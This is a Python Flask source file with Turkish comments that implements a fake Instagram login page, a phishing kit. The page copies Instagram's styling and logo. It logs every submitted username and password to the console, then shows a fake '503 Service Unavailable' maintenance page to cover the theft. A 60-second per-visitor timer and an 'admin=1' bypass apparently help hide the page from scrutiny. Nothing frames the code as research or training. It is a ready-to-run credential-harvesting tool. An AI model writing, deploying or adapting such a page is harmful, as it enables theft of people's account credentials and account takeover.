import os
from flask import Flask, request, render_template_string, session
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'gizli_anahtar_buraya' # Oturum takibi için gerekli

# --- INSTAGRAM TASARIMI (GÜNCELLENDİ) ---
HTML_TASARIM = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" class="logo">
        <form method="POST" action="/login">
            <input type="text" name="u" placeholder="Kullanıcı adı veya e-posta" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

HATA_SAYFASI = """
<body style="text-align:center;padding-top:100px;font-family:sans-serif;">
    <h1>503 Service Unavailable</h1>
    <p>Sunucu bakımda, lütfen daha sonra tekrar deneyin.</p>
</body>
"""

@app.route('/')
def home():
    # Admin girişi kontrolü
    if request.args.get('admin') == '1':
        return render_template_string(HTML_TASARIM)

    # Kişiye özel 60 saniye sayacı
    if 'start_time' not in session:
        session['start_time'] = datetime.now()
    
    sure_doldu_mu = datetime.now() > session['start_time'] + timedelta(seconds=60)
    
    if sure_doldu_mu:
        return render_template_string(HATA_SAYFASI), 503
    
    return render_template_string(HTML_TASARIM)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('u')
    pw = request.form.get('p')
    print(f"--- VERI GELDI --- Kullanici: {user} | Sifre: {pw}")
    return render_template_string(HATA_SAYFASI), 503

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
